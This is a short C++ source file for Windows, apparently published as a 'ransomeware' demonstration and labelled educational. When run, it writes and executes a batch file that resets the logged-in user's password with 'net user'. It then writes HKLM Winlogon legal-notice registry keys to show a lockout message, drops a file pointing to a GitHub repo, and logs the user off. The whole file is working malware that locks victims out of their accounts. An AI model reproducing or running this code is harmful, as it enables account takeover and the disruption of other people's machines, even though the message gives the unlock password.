#include<iostream>
#include<windows.h>
#include<fstream>
#include <stdlib.h>

#define payload "@echo off & net user \"%username%\" 31122020 && echo Success"

using namespace std;

void runnpayload()
{
	fstream f("c:\\payload.bat", ios::out);
	f << payload;
	f.close();
	return;
}

void savefile()
{
	fstream f("c:\\unlock.txt", ios::out);
	f << "https://github.com/sabarisrinivas-venkatesan/ransomeware";
	f.close();
	return;
}

void execpayload()
{
	system("C:\\payload.bat");
}

void logoff()

{
	system("shutdown -l");
}


void dispmessage()
{
	wstring a = L"Ransomeware Alert";
	HKEY regkey = NULL;
	LONG createkey = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &regkey);
	LONG ActivateKey = RegSetValueEx(regkey, L"legalnoticecaption", 0, REG_SZ, (byte*)a.c_str(), (a.size() + 1) * sizeof(wchar_t));
}

void dispmessage2()
{
	wstring a = L" This Malware is created only for educational Purpose You have been locked out by the ransomeware. Your old password will not work. To Unlock your system use the Password 31122020. To remove the malware completely refer unlock.md from the github repo https://github.com/sabarisrinivas-venkatesan/ransomeware (The Link is stored in the C: Drive root)";
	HKEY regkey = NULL;
	LONG createkey = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &regkey);
	LONG ActivateKey = RegSetValueEx(regkey, L"legalnoticetext", 0, REG_SZ, (byte*)a.c_str(), (a.size() + 1) * sizeof(wchar_t));
	
	
}

int main()
{
	runnpayload();
	dispmessage();
	dispmessage2();
	savefile();	execpayload();
	logoff();

}